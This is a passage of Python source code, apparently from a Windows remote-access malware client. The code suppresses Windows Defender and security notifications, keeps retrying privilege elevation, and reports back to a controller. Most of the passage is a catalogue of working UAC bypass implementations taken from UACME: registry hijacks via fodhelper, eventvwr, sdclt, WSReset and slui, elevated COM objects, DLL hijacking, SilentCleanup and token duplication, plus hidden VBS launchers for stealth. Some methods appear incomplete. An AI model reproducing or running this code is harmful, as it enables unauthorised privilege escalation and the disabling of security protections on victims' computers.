            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "DisableNotificationCenter", 1)
        if REGISTRY_ACTIONS.get('notify_center_hklm', True):
            set_dword(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "DisableNotificationCenter", 1)
        if REGISTRY_ACTIONS.get('explorer_balloon_tips', True):
            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "EnableBalloonTips", 0)
        if REGISTRY_ACTIONS.get('explorer_info_tip', True):
            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowInfoTip", 0)
        set_dword(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications", "DisableNotifications", 1)
        set_dword(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray", "HideSystray", 1)
        if REGISTRY_ACTIONS.get('toast_windows_update', True):
            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsUpdate", "Enabled", 0)
        if REGISTRY_ACTIONS.get('toast_security_maintenance', True):
            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance", "Enabled", 0)
        if REGISTRY_ACTIONS.get('toast_windows_security', True):
            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsSecurity", "Enabled", 0)
        if REGISTRY_ACTIONS.get('toast_sec_health_ui', True):
            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Microsoft.Windows.SecHealthUI", "Enabled", 0)
        log_message(f"[NOTIFICATIONS] Aggressive suppression applied ({success} settings)", "info")
        return success > 0
    except Exception as e:
        log_message(f"[NOTIFICATIONS] Aggressive suppression error: {e}", "error")
        return False
def perform_post_admin_actions():
    try:
        if not WINDOWS_AVAILABLE:
            return False
        if REGISTRY_ENABLED:
            ensure_registry_policies_and_context_menu()
            suppress_security_notifications_aggressive()
            disable_windows_notifications()
        if DEFENDER_DISABLE_ENABLED:
            disable_defender()
        return True
    except Exception:
        return False
def keep_trying_elevation():
    """Background thread that continuously tries to gain admin privileges."""
    retry_count = 0
    max_retries = 10
    retry_interval = 30  # seconds
    
    log_message("[ELEVATION] Background elevation thread started")
    
    while retry_count < max_retries:
        if is_admin():
            log_message("[ OK ] [ELEVATION] Successfully gained admin privileges!")
            try:
                sync_admin_status_to_controller()
            except Exception:
                pass
            # Immediately disable UAC
            disable_uac()
            if DEFENDER_DISABLE_ENABLED:
                disable_defender()
            if REGISTRY_ENABLED:
                disable_windows_notifications()
            return
        
        retry_count += 1
        log_message(f"[ELEVATION] Retry {retry_count}/{max_retries} - attempting UAC bypass...")
        
        # Try UAC bypass methods again
        if attempt_uac_bypass():
            log_message("[ OK ] [ELEVATION] UAC bypass successful on retry {retry_count}!")
            disable_uac()
            return
        
        # Wait before next retry
        time.sleep(retry_interval)
    
    log_message(f"[ ! ] [ELEVATION] Failed to gain admin after {max_retries} attempts")

def attempt_uac_bypass():
    """Attempt to bypass UAC using the ADVANCED UAC Manager."""
    try:
        global DISABLE_UAC_BYPASS, UAC_BYPASS_ALLOWED
        if DISABLE_UAC_BYPASS or not UAC_BYPASS_ALLOWED:
            emit_bypass_test_debug(None, 'global', action='skip', status='skipped', reason='disabled_or_not_allowed', point='attempt.global_gate')
            return False
    except Exception:
        pass
    debug_print("=" * 80)
    debug_print("[UAC BYPASS] attempt_uac_bypass() called")
    debug_print("=" * 80)
    emit_bypass_test_debug(None, 'global', action='start', status='pending', point='attempt.enter')
    try:
        emit_security_notification('info', 'UAC Bypass Attempt', 'Attempting elevation')
    except Exception:
        pass
    
    if not WINDOWS_AVAILABLE:
        debug_print("[ X ] [UAC BYPASS] Not Windows - bypass not available")
        emit_bypass_test_debug(None, 'global', action='skip', status='skipped', reason='not_windows', point='attempt.platform_check')
        return False
    try:
        if should_skip_uac_method():
            log_message("[UAC BYPASS] Skipped due to Windows Defender detection", "warning")
            emit_bypass_test_debug(None, 'global', action='skip', status='skipped', reason='defender_detection', point='attempt.defender_check')
            return False
    except Exception:
        pass
    
    debug_print("[UAC BYPASS] Checking if already admin...")
    if is_admin():
        debug_print("[ OK ] [UAC BYPASS] Already admin - no bypass needed")
        log_message("[UAC BYPASS] Already running as admin", "info")
        emit_bypass_test_debug(None, 'global', action='skip', status='skipped', reason='already_admin', point='attempt.admin_check')
        return True
    
    debug_print("[UAC BYPASS] Not admin - starting UAC bypass...")
    log_message("[UAC BYPASS] Starting ADVANCED UAC bypass using UAC Manager...", "info")
    try:
        ensure_registry_policies_and_context_menu()
    except Exception:
        pass
    try:
        if REGISTRY_ENABLED and REGISTRY_ACTIONS.get('disableRealtimeMonitoring', True):
            disable_realtime_monitoring_before_uac()
    except Exception:
        pass
    
    # Use the professional UAC Manager (lazy-initialized)
    debug_print("[UAC BYPASS] Initializing UAC Manager...")
    try:
        manager = get_uac_manager()
        debug_print(f"[ OK ] [UAC BYPASS] UAC Manager initialized with {len(manager.methods)} methods")
    except Exception as e:
        debug_print(f"[ X ] [UAC BYPASS] UAC Manager initialization FAILED: {e}")
        import traceback
        traceback.print_exc()
        emit_bypass_test_debug(None, 'global', action='error', status='error', reason=str(e), point='attempt.manager_init')
        return False
    
    debug_print("[UAC BYPASS] Calling manager.try_all_methods()...")
    result = manager.try_all_methods()
    
    if result:
        debug_print("=" * 80)
        debug_print("[ OK ] [UAC BYPASS] Elevated instance launched successfully!")
        debug_print("[ OK ] [UAC BYPASS] Checking if THIS process gained admin...")
        debug_print("=" * 80)
        
        # Important: UAC bypass launches a NEW elevated instance
        # We need to check if THIS current process is now admin
        time.sleep(2)  # Give the elevated instance time to start
        
        if is_admin():
            # Somehow THIS process became admin (unusual but possible)
            debug_print("[ OK ] [UAC BYPASS] THIS process is now admin!")
            log_message("[ OK ] [UAC BYPASS] UAC bypass successful - now running as admin!", "success")
            try:
                emit_security_notification('success', 'UAC Bypass Successful', 'Admin privileges gained')
            except Exception:
                pass
            try:
                sync_admin_status_to_controller()
            except Exception:
                pass
            try:
                perform_post_admin_actions()
            except Exception:
                pass
            emit_bypass_test_debug(None, 'global', action='result', status='success', point='attempt.result')
            return True
        else:
            # A separate elevated instance was launched
            # This current process is still NOT admin
            debug_print("[ ! ] [UAC BYPASS] Elevated instance launched, but THIS process is still NOT admin")
            debug_print("[ ! ] [UAC BYPASS] The elevated instance will take over")
            log_message("[ ! ] [UAC BYPASS] Elevated instance launched", "warning")
            
            if KEEP_ORIGINAL_PROCESS:
                # Keep running (useful for debugging or manual operation)
                debug_print("[i] [UAC BYPASS] Keeping original process running (KEEP_ORIGINAL_PROCESS=True)")
                debug_print("[i] [UAC BYPASS] Note: Both non-admin and admin instances are now running")
                log_message("[i] Original process will continue running alongside elevated instance", "info")
                emit_bypass_test_debug(None, 'global', action='result', status='failed', reason='child_elevated_only', point='attempt.result')
                return True
            else:
                # Exit this non-admin instance to prevent duplicates (stealth mode)
                debug_print("[ ! ] [UAC BYPASS] Exiting original instance to avoid duplicates")
                time.sleep(2)  # Give elevated instance time to fully start
                sys.exit(0)  # Exit old instance, let elevated instance take over
    else:
        debug_print("=" * 80)
        debug_print("[ X ][ X ][ X ] [UAC BYPASS] FAILED! All methods failed!")
        debug_print("=" * 80)
        log_message("[ X ] [UAC BYPASS] All UAC Manager methods failed", "error")
        try:
            emit_security_notification('error', 'UAC Bypass Failed', 'Bypass methods did not succeed')
        except Exception:
            pass
        emit_bypass_test_debug(None, 'global', action='result', status='failed', reason='all_methods_failed', point='attempt.result')
    
    return result

# Alias for compatibility
def elevate_privileges():
    """Alias for attempt_uac_bypass() - for compatibility."""
    return attempt_uac_bypass()

def bypass_uac_cmlua_com():
    """UAC bypass using ICMLuaUtil COM interface (UACME Method 41)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import win32com.client
        import pythoncom
    except ImportError:
        log_message("win32com not available for ICMLuaUtil bypass", "warning")
        return False
    
    try:
        
        # Initialize COM
        pythoncom.CoInitialize()
        
        # Create elevated COM object
        # CLSID for ICMLuaUtil: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
        try:
            lua_util = win32com.client.Dispatch("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
            
            # Execute elevated command using ShellExec method
            current_exe = os.path.abspath(__file__)
            if current_exe.endswith('.py'):
                current_exe = f'python.exe "{current_exe}"'
            
            lua_util.ShellExec(current_exe, "", "", 0, 1)
            return True
            
        except Exception as e:
            log_message(f"ICMLuaUtil COM bypass failed: {e}")
            return False
        finally:
            pythoncom.CoUninitialize()
            
    except Exception as e:
        log_message(f"ICMLuaUtil COM initialization failed: {e}")
        return False

def bypass_uac_fodhelper_protocol():
    """UAC bypass using fodhelper.exe and ms-settings protocol (UACME Method 33)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        script_path = os.path.abspath(__file__)
        pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
        if os.path.exists(pyw):
            current_exe = f'"{pyw}" "{script_path}"'
        else:
            vdir = os.path.join(os.environ.get('APPDATA', ''), "ClientLauncher")
            os.makedirs(vdir, exist_ok=True)
            vbs_path = os.path.join(vdir, "client_autostart.vbs")
            cmd = f'"{sys.executable}" "{script_path}"'
            vbs = (
                'Set oShell = CreateObject("WScript.Shell")\n'
                f'oShell.CurrentDirectory = "{os.path.dirname(script_path)}"\n'
                f'oShell.Run "{cmd}", 0, false\n'
            )
            with open(vbs_path, 'w') as f:
                f.write(vbs)
            current_exe = f'wscript.exe "{vbs_path}"'
        
        # Create protocol handler for ms-settings
        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Execute fodhelper to trigger bypass - use SystemRoot to avoid file system redirection
            fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
            subprocess.Popen([fodhelper_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            log_message(f"Fodhelper protocol bypass failed: {e}")
            return False
            
    except ImportError:
        return False
def bypass_uac_computerdefaults():
    """UAC bypass using computerdefaults.exe registry manipulation."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        
        computerdefaults_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'computerdefaults.exe')
        subprocess.Popen([computerdefaults_path], 
                        creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(2)
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except:
            pass
            
        return True
        
    except Exception as e:
        log_message(f"Computerdefaults UAC bypass failed: {e}")
        return False

def bypass_uac_dccw_com():
    """UAC bypass using IColorDataProxy COM interface (UACME Method 43)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import win32com.client
        import pythoncom
    except ImportError:
        log_message("win32com not available for IColorDataProxy bypass", "warning")
        return False
    
    try:
        
        pythoncom.CoInitialize()
        
        try:
            # First use ICMLuaUtil to set registry
            lua_util = win32com.client.Dispatch("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
            
            current_exe = os.path.abspath(__file__)
            if current_exe.endswith('.py'):
                current_exe = f'python.exe "{current_exe}"'
            
            # Set DisplayCalibrator registry value
            reg_path = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ICM\Calibration"
            lua_util.SetRegistryStringValue(2147483650, reg_path, "DisplayCalibrator", current_exe)
            
            # Create IColorDataProxy COM object
            color_proxy = win32com.client.Dispatch("Elevation:Administrator!new:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}")
            
            # Launch DCCW which will execute our payload
            color_proxy.LaunchDccw(0)
            
            return True
            
        except Exception as e:
            log_message(f"ColorDataProxy COM bypass failed: {e}")
            return False
        finally:
            pythoncom.CoUninitialize()
            
    except Exception as e:
        log_message(f"ColorDataProxy COM initialization failed: {e}")
        return False

def bypass_uac_dismcore_hijack():
    """UAC bypass using DismCore.dll hijacking (UACME Method 23)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Create malicious DismCore.dll in temp directory
        temp_dir = tempfile.gettempdir()
        dismcore_path = os.path.join(temp_dir, "DismCore.dll")
        
        # Simple DLL that executes our payload
        dll_code = f'''
#include <windows.h>
#include <stdio.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
    switch (ul_reason_for_call) {{
    case DLL_PROCESS_ATTACH:
        system("python.exe \\"{os.path.abspath(__file__)}\\"");
        break;
    }}
    return TRUE;
}}
'''
        
        # For demonstration, we'll use a different approach
        # Copy a legitimate system DLL and modify PATH
        system32_path = os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32'
        
        # Add temp directory to PATH so pkgmgr.exe finds our DLL first
        current_path = os.environ.get('PATH', '')
        os.environ['PATH'] = temp_dir + ';' + current_path
        
        try:
            # Execute pkgmgr.exe which will load our DismCore.dll
            subprocess.Popen([os.path.join(system32_path, 'pkgmgr.exe'), '/n:test'], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            return True
            
        finally:
            # Restore PATH
            os.environ['PATH'] = current_path
            
    except Exception as e:
        log_message(f"DismCore hijack bypass failed: {e}")
        return False

def bypass_uac_wow64_logger():
    """UAC bypass using wow64log.dll hijacking (UACME Method 30)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # This method works by placing wow64log.dll in PATH
        # and executing a WOW64 process that will load it
        temp_dir = tempfile.gettempdir()
        
        # Add temp to PATH
        current_path = os.environ.get('PATH', '')
        os.environ['PATH'] = temp_dir + ';' + current_path
        
        try:
            # Execute a WOW64 process that will attempt to load wow64log.dll
            subprocess.Popen([r"C:\Windows\SysWOW64\wusa.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            return True
            
        finally:
            os.environ['PATH'] = current_path
            
    except Exception as e:
        log_message(f"WOW64 logger bypass failed: {e}")
        return False

def bypass_uac_silentcleanup():
    """UAC bypass using SilentCleanup scheduled task (UACME Method 34)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Modify windir environment variable temporarily
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create fake windir structure
        fake_windir = os.path.join(tempfile.gettempdir(), "Windows")
        fake_system32 = os.path.join(fake_windir, "System32")
        os.makedirs(fake_system32, exist_ok=True)
        
        # Copy our payload as svchost.exe
        fake_svchost = os.path.join(fake_system32, "svchost.exe")
        
        # For Python script, create a batch wrapper
        batch_content = f'@echo off\n{current_exe}\n'
        with open(fake_svchost.replace('.exe', '.bat'), 'w') as f:
            f.write(batch_content)
        
        # Temporarily modify windir environment
        original_windir = os.environ.get('windir', 'C:\\Windows')
        os.environ['windir'] = fake_windir
        
        try:
            # Execute SilentCleanup task
            subprocess.run([
                'schtasks.exe', '/Run', '/TN', '\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup'
            ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            time.sleep(2)
            return True
            
        finally:
            os.environ['windir'] = original_windir
            
    except Exception as e:
        log_message(f"SilentCleanup bypass failed: {e}")
        return False

def bypass_uac_token_manipulation():
    """UAC bypass using token manipulation (UACME Method 35)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Find an auto-elevated process to duplicate token from
        if not PSUTIL_AVAILABLE:
            return False
            
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'].lower() in ['consent.exe', 'slui.exe', 'fodhelper.exe']:
                    # Get process handle
                    process_handle = win32api.OpenProcess(
                        win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_DUP_HANDLE,
                        False,
                        proc.info['pid']
                    )
                    
                    # Get process token
                    token_handle = win32security.OpenProcessToken(
                        process_handle,
                        win32security.TOKEN_DUPLICATE | win32security.TOKEN_QUERY
                    )
                    
                    # Duplicate token
                    new_token = win32security.DuplicateTokenEx(
                        token_handle,
                        win32security.SecurityImpersonation,
                        win32security.TOKEN_ALL_ACCESS,
                        win32security.TokenPrimary
                    )
                    
                    # Create process with duplicated token
                    current_exe = os.path.abspath(__file__)
                    if current_exe.endswith('.py'):
                        current_exe = f'python.exe "{current_exe}"'
                    
                    si = win32process.STARTUPINFO()
                    pi = win32process.CreateProcessAsUser(
                        new_token,
                        None,
                        current_exe,
                        None,
                        None,
                        False,
                        0,
                        None,
                        None,
                        si
                    )
                    
                    win32api.CloseHandle(process_handle)
                    win32api.CloseHandle(token_handle)
                    win32api.CloseHandle(new_token)
                    win32api.CloseHandle(pi[0])
                    win32api.CloseHandle(pi[1])
                    
                    return True
                    
            except:
                continue
                
        return False
        
    except Exception as e:
        log_message(f"Token manipulation bypass failed: {e}")
        return False

def bypass_uac_junction_method():
    """UAC bypass using NTFS junction/reparse points (UACME Method 36)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Create junction point to redirect DLL loading
        temp_dir = tempfile.gettempdir()
        junction_dir = os.path.join(temp_dir, "junction_target")
        
        # Create target directory
        os.makedirs(junction_dir, exist_ok=True)
        
        # Use mklink to create junction (requires admin, so this is simplified)
        try:
            subprocess.run([
                'powershell.exe', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-Command', 'mklink', '/J', 
                os.path.join(temp_dir, "fake_system32"),
                junction_dir
            ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
            
            return True
            
        except subprocess.CalledProcessError:
            return False
            
    except Exception as e:
        log_message(f"Junction method bypass failed: {e}")
        return False

def bypass_uac_cor_profiler():
    """UAC bypass using .NET Code Profiler (UACME Method 39)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Set environment variables for .NET profiler
        current_exe = os.path.abspath(__file__)
        
        # Create a fake profiler DLL path
        profiler_path = os.path.join(tempfile.gettempdir(), "profiler.dll")
        
        # Set profiler environment variables
        os.environ['COR_ENABLE_PROFILING'] = '1'
        os.environ['COR_PROFILER'] = '{CF0D821E-299B-5307-A3D8-B283C03916DD}'
        os.environ['COR_PROFILER_PATH'] = profiler_path
        
        try:
            # Execute a .NET application that will load our profiler
            mmc_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'mmc.exe')
            subprocess.Popen([mmc_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            return True
            
        finally:
            # Clean up environment
            for var in ['COR_ENABLE_PROFILING', 'COR_PROFILER', 'COR_PROFILER_PATH']:
                os.environ.pop(var, None)
                
    except Exception as e:
        log_message(f"COR profiler bypass failed: {e}")
        return False

def bypass_uac_com_handlers():
    """UAC bypass using COM handler hijacking (UACME Method 40)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        # Hijack COM handler for a file type
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create fake COM handler
        handler_key = r"Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}"
        command_key = handler_key + r"\Shell\Open\Command"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, command_key)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Trigger COM handler through mmc.exe
            mmc_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'mmc.exe')
            subprocess.Popen([mmc_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, handler_key)
            except:
                pass
                
            return True
            
        except Exception as e:
            log_message(f"COM handlers bypass failed: {e}")
            return False
            
    except ImportError:
        return False
def bypass_uac_volatile_env():
    """UAC bypass using volatile environment variables (UACME Method 44)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Set volatile environment variable
        env_key = r"Environment"
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, env_key, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "windir", 0, winreg.REG_EXPAND_SZ, os.path.dirname(current_exe))
            winreg.CloseKey(key)
            
            # Execute auto-elevated process that uses environment variables
            fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
            subprocess.Popen([fodhelper_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            
            # Clean up
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, env_key, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "windir")
                winreg.CloseKey(key)
            except:
                pass
                
            return True
            
        except Exception as e:
            log_message(f"Volatile environment bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_slui_hijack():
    """UAC bypass using slui.exe registry hijacking (UACME Method 45)."""
    if not WINDOWS_AVAILABLE:
        return False
    if DISABLE_SLUI_BYPASS:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack slui.exe through registry
        key_path = r"Software\Classes\exefile\shell\open\command"
        
        try:
            # Backup original value
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                original_value = winreg.QueryValueEx(key, "")[0]
                winreg.CloseKey(key)
            except:
                original_value = None
            
            # Set our payload
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Execute slui.exe - use SystemRoot to avoid file system redirection
            slui_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'slui.exe')
            
            # Check if slui.exe exists before trying to execute it
            if not os.path.exists(slui_path):
                log_message(f"SLUI.exe not found at: {slui_path}", "error")
                # Try alternative locations or methods
                slui_path = "C:\\Windows\\System32\\slui.exe"
                if not os.path.exists(slui_path):
                    log_message("SLUI.exe not found in standard locations", "error")
                    return False
            
            # Execute with comprehensive error handling - try all available methods
            execution_methods = [
                # Method 1: cmd /c (no console)
                (['cmd', '/c', slui_path], "cmd /c method"),
                # Method 2: Direct execution
                ([slui_path], "direct execution"),
                # Method 3: Shell execution with full path
                (slui_path, "shell execution"),
                # Method 4: Use start command with minimized window
                (['cmd', '/c', 'start', '""', '/min', slui_path], "start minimized"),
                # Method 5: Use PowerShell
                (['powershell', '-Command', f'Start-Process -FilePath "{slui_path}" -WindowStyle Hidden'], "PowerShell hidden")
            ]
            
            success = False
            for method_args, method_name in execution_methods:
                try:
                    if isinstance(method_args, list):
                        subprocess.Popen(method_args, creationflags=subprocess.CREATE_NO_WINDOW)
                    else:
                        import shlex
                        args = ['cmd', '/c', method_args] if os.name == 'nt' else shlex.split(method_args)
                        subprocess.Popen(args, creationflags=subprocess.CREATE_NO_WINDOW)
                    
                    log_message(f"[ OK ] Successfully executed slui.exe using {method_name}")
                    success = True
                    break
                except Exception as e:
                    log_message(f"[ X ] Failed to execute slui.exe using {method_name}: {e}", "warning")
                    continue
            
            if not success:
                log_message("[ X ] All slui.exe execution methods failed", "error")
                return False
            
            time.sleep(2)
            
            # Restore original value
            try:
                if original_value:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
                    winreg.CloseKey(key)
                else:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            log_message(f"SLUI hijack bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_eventvwr():
    """UAC bypass using EventVwr.exe registry hijacking (UACME Method 25)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack mscfile association
        key_path = r"Software\Classes\mscfile\shell\open\command"
        
        try:
            # Backup original value
            original_value = None
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                original_value = winreg.QueryValueEx(key, "")[0]
                winreg.CloseKey(key)
            except:
                pass
            
            # Set our payload
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Execute eventvwr.exe
            eventvwr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'eventvwr.exe')
            subprocess.Popen([eventvwr_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Restore original value
            try:
                if original_value:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
                    winreg.CloseKey(key)
                else:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            log_message(f"EventVwr bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_sdclt():
    """UAC bypass using sdclt.exe (UACME Method 31)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack App Paths for control.exe
        key_path = r"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
        
        try:
            # Create the registry key
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Execute sdclt.exe which will call control.exe
            sdclt_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'sdclt.exe')
            subprocess.Popen([sdclt_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            log_message(f"SDCLT bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_wsreset():
    """UAC bypass using WSReset.exe (UACME Method 56)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack ActivatableClassId for WSReset
        key_path = r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Execute WSReset.exe
            wsreset_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WSReset.exe')
            subprocess.Popen([wsreset_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            log_message(f"WSReset bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_appinfo_service():
    """UAC bypass using AppInfo service manipulation (UACME Method 61) - VBS Edition."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # This method involves manipulating the Application Information service
        # to bypass UAC by modifying service permissions
        # ENHANCED: Uses VBS instead of CMD for stealth
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create VBS script for stealthy execution
        vbs_script = f'''
Set objShell = CreateObject("WScript.Shell")
objShell.Run "{current_exe}", 0, False
Set objShell = Nothing
'''
        
        # Save VBS to temp directory
        import tempfile
        vbs_path = os.path.join(tempfile.gettempdir(), "sysupdate.vbs")
        
        try:
            with open(vbs_path, 'w') as f:
                f.write(vbs_script)
        except Exception as e:
            log_message(f"Failed to create VBS script: {e}")
            return False
        
